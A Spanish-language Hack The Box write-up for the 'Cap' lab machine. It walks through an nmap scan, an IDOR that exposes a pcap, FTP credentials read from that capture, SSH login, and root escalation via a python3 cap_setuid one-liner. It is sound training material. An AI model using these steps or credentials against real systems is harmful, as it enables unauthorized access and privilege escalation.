
# Hack The Box - Cap Writeup 🛡️

![HTB Cap](https://img.shields.io/badge/HTB-Cap-green.svg) ![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green.svg) ![Category-Linux](https://img.shields.io/badge/Category-Linux-blue.svg)

Este es el reporte detallado de la resolución de la máquina **Cap** de Hack The Box. Se cubren todas las fases: desde el reconocimiento inicial hasta la escalada de privilegios.

---

## 📊 Información de la Máquina

- **Nombre:** Cap
- **IP Target:** `10.10.10.245`
- **Sistema Operativo:** Linux
- **Dificultad:** Fácil

---

## 🛠️ Paso 1: Reconocimiento e Enumeración

### Escaneo de RED (Nmap)

Se inicia con un escaneo exhaustivo de servicios y versiones:

```bash
nmap -sV -sC -Pn 10.10.10.245
```

**Resultado del escaneo:**

- **Puerto 21/TCP (FTP):** vsftpd 3.0.3 - Permite transferencia de archivos
- **Puerto 22/TCP (SSH):** OpenSSH 8.2p1 - Acceso remoto
- **Puerto 80/TCP (HTTP):** Gunicorn - Servidor web con Security Dashboard

---

## 🛠️ Paso 2: Análisis de Vulnerabilidades Web (IDOR)

Al explorar el sitio web en el puerto 80, encontramos la funcionalidad **Security Snapshot**. Esta herramienta genera capturas de tráfico.

- La URL inicial es `http://10.10.10.245/data/1`
- Probamos vulnerabilidad **IDOR** cambiando el ID a `0`
- En `http://10.10.10.245/data/0`, descargamos el archivo `0.pcap`

---

## 🛠️ Paso 3: Explotación (Análisis PCAP)

Analizamos el archivo de tráfico usando Wireshark. Al filtrar por FTP, encontramos credenciales en texto plano:

```
Usuario: nathan
Contraseña: Buck37p4nd4
```

---

## 🛠️ Paso 4: Foothold (Acceso Inicial)

Accedemos vía SSH:

```bash
ssh nathan@10.10.10.245
```

Obtenemos la flag de usuario:

```bash
cat /home/nathan/user.txt
```

---

## 🛠️ Paso 5: Escalada de Privilegios (Root)

Buscamos archivos con capacidades especiales:

```bash
getcap -r / 2>/dev/null
```

**Resultado crítico:**
```
/usr/bin/python3.8 = cap_setuid+ep
```

Explotamos la capacidad `cap_setuid`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verificamos y obtenemos la flag de root:

```bash
whoami
cat /root/root.txt
```
